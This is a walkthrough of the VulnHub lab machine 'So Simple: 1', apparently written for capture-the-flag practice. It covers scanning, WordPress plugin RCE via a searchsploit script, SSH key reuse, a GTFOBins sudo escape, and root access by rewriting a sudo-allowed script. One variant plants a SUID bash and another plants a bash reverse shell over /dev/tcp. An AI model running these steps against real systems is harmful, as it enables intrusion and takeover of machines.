

# So Simple: 1 Walkthrough 

**VulnHub Link:** [So Simple: 1](https://www.vulnhub.com/entry/so-simple-1,515/)
**Difficulty:** Easy
**Release Date:** 17 Jul 2020


## 1.Reconnaissance
```bash
rustscan -a 192.168.1.80 --ulimit 5000
nmap -sV -A -O -T5 -sC 192.168.1.80 -p22,80 > nmap.txt
```

## 2.Web Enumeration
```bash
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://192.168.1.80/FUZZ
```

We found out it is Wordpress site and We can absolutely use wpscan tool

```bash
wpscan --url http://192.168.1.80/wordpress --api-token [REDACTED] --enumerate ap,u
```

You can obtain api token from WP-Scan website which is completely free and makes scan so fast))

and we found out Social Warfare WordPress Plugin 3.5.2 - Remote Code Execution (RCE) from wp-scan output

searchsploit -m multiple/webapps/52346.py and we changing configs inside the python script and execute


## 3.Privilege Escalation (Horizontal)
Once we got the initial access to the target , We can search common things such as sudo -l or suid bytes 

But .ssh directory of max user is readable by everyone 

```bash
ssh max@localhost -i id_rsa
```

AND Here we goo , we are max user

Then trying 
```bash
sudo -l
sudo -u steven /usr/sbin/service ../../bin/sh
```

and booom --> We are Steven (We got last command from GTFOBins)

and now again sudo -l command and we got -- (root) NOPASSWD: /opt/tools/server-health.sh --

now we have multiple ways for root access , I will show two of them : 

### 1.SUID Byte ->
```bash
nano /opt/tools/server-health.sh
#!/bin/bash
sudo chmod u+s /bin/bash (CTRL + O,SHIFT + Y, CTRL + X)
chmod +x server-health.sh
sudo -u root /opt/tools/server-health.sh
```

### 2.Reverse shell

(Open Listener Before Executing last command)

```bash
nano /opt/tools/server-health.sh
#!/bin/bash
bash -i >& /dev/tcp/192.168.1.80/1338 0>&1
chmod +x server-health.sh
sudo -u root /opt/tools/server-health.sh
```

AND BOOM . We hacked
